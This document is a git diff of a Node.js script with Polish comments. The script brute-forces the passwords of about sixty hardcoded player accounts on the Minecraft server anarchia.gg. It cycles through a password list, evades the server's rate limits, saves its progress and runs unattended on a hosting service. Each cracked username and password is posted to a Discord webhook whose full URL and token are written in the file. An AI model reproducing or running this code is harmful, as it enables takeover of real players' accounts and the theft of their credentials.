@@ -1,11 +1,28 @@
 import mineflayer from 'mineflayer';
 import fs from 'fs';
 import https from 'https';
-import http from 'http'; // ← DODAJ TO
+import http from 'http';
 
 const server = { host: 'anarchia.gg', port: 25565 };
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457118913962709012/DnLe-AkG_W9GOp7wR2kJoS36JvL3HHDdIBf-ogrZfN3B6yOxi7-IZYFPanx_qFgJVJZP';
 const PROGRESS_FILE = 'progress.json';
+
+// ============ HARDCODED NICKI ============
+const HARDCODED_USERNAMES = [
+    'jestem_sigma212', 'spiewaj', 'maty6615', 'karablox123', 'kaczk12345',
+    'nxenoxn', 'spocuszek_0071', 'Damianxq__', 'szymonekkk17', 'megaknight009',
+    'l3nav', 'Osp_Man', 'Trawa_083', 'CARTOPTICK47168', 'zbieram250mln',
+    'DziadekZbysiek', 'Oddajesz_iteczki', 'masziczopek1112', 'yungmaciassww',
+    'AlanekToSmiec', 'reve_2137', 'berdyszko', 'Kato95', 'Janek2324',
+    'piosenkaomacku', 'Zuzanna__2137', 'kuba_ogro', 'x_szyszek_xx',
+    'groznyjacek21', 'Oliwier001023', 'debilnieuminic5', 'Radek2021',
+    'zdrada67', 'Sucharek_gg', 'paruwka2148', 'fortniteszymonek',
+    'RICk_PL123', 'KotBOB', 'Mroczanek2137', 'Burgerman_66', 'MrlolixPl',
+    'WOJTEKJESTBSAGIM', 'babka_delulu', 'LAZERDIM7235', 'An4lnnT3rr0r',
+    'Kaczorek_69', 'ryszardoo_', 'XX_PONCZEK_XX', 'Anxoszef', 'pawlekq2',
+    'userek21_6', 'PORTORYKANIN', 'Milionowy321', 'h4v0c__', 'PLnigerekkk',
+    'maszproblem2115', 'mumink_2137', 'XAVI22144', 'Gula113'
+];
 
 // ============ KEEP-ALIVE SERVER ============
 const KEEP_ALIVE_PORT = 3000;
@@ -56,7 +73,7 @@ keepAliveServer.listen(KEEP_ALIVE_PORT, () => {
     console.log(`🌐 Keep-alive server on port ${KEEP_ALIVE_PORT}`);
 });
 
-// ← DODAJ HTTP SERVER (Fly.io tego wymaga)
+// HTTP SERVER (Fly.io tego wymaga)
 const HTTP_PORT = process.env.PORT || 8080;
 const httpServer = http.createServer((req, res) => {
     const progress = loadProgress();
@@ -82,11 +99,8 @@ httpServer.listen(HTTP_PORT, () => {
     console.log(`🌐 HTTP server running on port ${HTTP_PORT}`);
 });
 
-// ... reszta twojego kodu (wszystkie funkcje) ...
-// Na początku pliku, po import
 let backupInterval = null;
 
-// Funkcja backup
 function backupProgress() {
     try {
         if (fs.existsSync(PROGRESS_FILE)) {
@@ -100,13 +114,6 @@ function backupProgress() {
     }
 }
 
-// W funkcji main(), po "Rozpocznij bruteforce", dodaj:
-// Auto-backup co 5 minut
-backupInterval = setInterval(() => {
-    backupProgress();
-}, 5 * 60 * 1000); // 5 minut
-
-// Funkcja wysyłająca wiadomość na Discord
 function sendToDiscord(username, password) {
     console.log(`🔔 Wysyłam: ${username}:${password}`);
     
@@ -118,7 +125,7 @@ function sendToDiscord(username, password) {
     const payload = JSON.stringify({
         embeds: [{
             title: "🎯 Znaleziono działające konto!",
-            color: 0x00ff00, // Zielony kolor
+            color: 0x00ff00,
             fields: [
                 {
                     name: "👤 Nickname",
@@ -176,7 +183,6 @@ function sendToDiscord(username, password) {
     req.end();
 }
 
-// Funkcje do zarządzania postępem
 function loadProgress() {
     if (fs.existsSync(PROGRESS_FILE)) {
         try {
@@ -192,7 +198,6 @@ function saveProgress(username, passwordIndex, totalPasswords) {
     try {
         let progress = {};
         
-        // Wczytaj istniejący progress (bezpiecznie)
         if (fs.existsSync(PROGRESS_FILE)) {
             try {
                 const data = fs.readFileSync(PROGRESS_FILE, 'utf8');
@@ -203,14 +208,12 @@ function saveProgress(username, passwordIndex, totalPasswords) {
             }
         }
         
-        // Aktualizuj tylko to konto
         progress[username] = {
             lastIndex: passwordIndex,
             totalPasswords: totalPasswords,
             timestamp: new Date().toISOString()
         };
         
-        // Zapisz bezpiecznie (atomic write)
         const tempFile = PROGRESS_FILE + '.tmp';
         fs.writeFileSync(tempFile, JSON.stringify(progress, null, 2));
         fs.renameSync(tempFile, PROGRESS_FILE);
@@ -229,7 +232,6 @@ function clearProgress(username) {
     try {
         const progress = loadProgress();
         
-        // Usuń TYLKO to konto
         if (progress[username]) {
             delete progress[username];
             fs.writeFileSync(PROGRESS_FILE, JSON.stringify(progress, null, 2));
@@ -251,7 +253,6 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// Funkcja wykrywająca rate limit z wiadomości
 function isRateLimited(reason) {
     const reasonStr = reason.toString().toLowerCase();
     return reasonStr.includes('zbyt często') || 
@@ -259,8 +260,6 @@ function isRateLimited(reason) {
            reasonStr.includes('rate limit');
 }
 
-// Główna funkcja bruteforce
-// POPRAWIONA funkcja bruteforceAccount
 async function bruteforceAccount(username, passwords) {
     let passwordIndex = getLastIndex(username);
     let consecutiveRateLimits = 0;
@@ -276,25 +275,22 @@ async function bruteforceAccount(username, passwords) {
         if (result.status === 'success') {
             console.log(`\n✅ [${username}] ZNALEZIONO! Hasło: ${result.password}`);
             sendToDiscord(username, result.password);
-            clearProgress(username); // ✅ Usuń TYLKO tutaj przy sukcesie
+            clearProgress(username);
             return 'success';
         } else if (result.status === 'premium') {
             console.log(`\n💎 [${username}] Konto premium - STOP`);
-            // ❌ NIE USUWAMY - może się zmienić
             return 'premium';
         } else if (result.status === 'already_online') {
             console.log(`\n🔄 [${username}] Gracz już online`);
-            // ❌ NIE USUWAMY - będzie retry
             return 'already_online';
         } else if (result.status === 'not_registered') {
             console.log(`\n🛑 [${username}] Niezarejestrowane - STOP`);
-            // ❌ NIE USUWAMY - może się zarejestrować później
             return 'not_registered';
         } else if (result.status === 'rate_limited') {
             consecutiveRateLimits++;
             consecutiveErrors = 0;
             passwordIndex = result.nextIndex;
-            saveProgress(username, passwordIndex, passwords.length); // ✅ ZAPISZ
+            saveProgress(username, passwordIndex, passwords.length);
             
             const delay = Math.min(consecutiveRateLimits * 1000, 5000);
             console.log(`⏳ [${username}] Rate limit - czekam ${delay/1000}s`);
@@ -303,7 +299,7 @@ async function bruteforceAccount(username, passwords) {
             consecutiveErrors++;
             consecutiveRateLimits = 0;
             passwordIndex = result.nextIndex;
-            saveProgress(username, passwordIndex, passwords.length); // ✅ ZAPISZ
+            saveProgress(username, passwordIndex, passwords.length);
             
             const delay = Math.min(consecutiveErrors * 500, 3000);
             console.log(`⚠️ [${username}] Błąd połączenia - czekam ${delay/1000}s`);
@@ -312,19 +308,15 @@ async function bruteforceAccount(username, passwords) {
             consecutiveRateLimits = 0;
             consecutiveErrors = 0;
             passwordIndex = result.nextIndex;
-            saveProgress(username, passwordIndex, passwords.length); // ✅ ZAPISZ
+            saveProgress(username, passwordIndex, passwords.length);
             await sleep(200);
         }
     }
 
     console.log(`\n❌ [${username}] Nie znaleziono hasła (${passwords.length} prób)`);
-    // ❌ NIE USUWAMY - może user doda więcej haseł
     return 'completed';
 }
 
-
-
-// Funkcja bruteforce dla konta z retry na "already online"
 async function bruteforceWithRetry(username, passwords) {
     while (true) {
         const result = await bruteforceAccount(username, passwords);
@@ -336,12 +328,10 @@ async function bruteforceWithRetry(username, passwords) {
             continue;
         }
         
-        // Zakończ dla innych statusów
         break;
     }
 }
 
-// Sesja logowania - ULTRA SZYBKA Z OBSŁUGĄ BŁĘDÓW
 async function tryPasswordsInSession(username, passwords, startIndex) {
     return new Promise((resolve) => {
         let bot = null;
@@ -527,36 +517,15 @@ async function tryPasswordsInSession(username, passwords, startIndex) {
     });
 }
 
-// Główna funkcja programu
 async function main() {
     console.log('━'.repeat(60));
-    console.log('🚀 MINECRAFT BRUTEFORCE - MULTI ACCOUNT MODE');
+    console.log('🚀 MINECRAFT BRUTEFORCE - AUTO MODE');
     console.log('━'.repeat(60));
 
-    const readline = await import('readline');
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-
-    const usernamesInput = await new Promise((resolve) => {
-        rl.question('👤 Nicki (oddziel przecinkami): ', (answer) => {
-            rl.close();
-            resolve(answer.trim());
-        });
-    });
-
-    if (!usernamesInput) {
-        console.log('❌ Brak nicków!');
-        return;
-    }
-
-    const usernames = usernamesInput.split(',').map(u => u.trim()).filter(u => u);
+    // UŻYJ HARDCODED NICKÓW (bez pytania)
+    const usernames = HARDCODED_USERNAMES;
     
-    if (usernames.length === 0) {
-        console.log('❌ Brak poprawnych nicków!');
-        return;
-    }
+    console.log(`👥 Załadowano ${usernames.length} kont`);
 
     const passwordFile = 'passwords.txt';
     if (!fs.existsSync(passwordFile)) {
@@ -583,6 +552,11 @@ async function main() {
     
     console.log('━'.repeat(60));
 
+    // Auto-backup co 5 minut
+    backupInterval = setInterval(() => {
+        backupProgress();
+    }, 5 * 60 * 1000);
+
     const tasks = usernames.map(username => bruteforceWithRetry(username, passwords));
     await Promise.all(tasks);
 
@@ -590,7 +564,6 @@ async function main() {
     console.log('🏁 Zakończono wszystkie konta');
 }
 
-// Obsługa nieoczekiwanych błędów
 process.on('uncaughtException', (err) => {
     console.error('⚠️ Nieoczekiwany błąd:', err.message);
 });
@@ -602,6 +575,4 @@ process.on('unhandledRejection', (reason, promise) => {
 main().catch(err => {
     console.error('❌ Błąd krytyczny:', err.message);
     process.exit(1);
-
 });
-
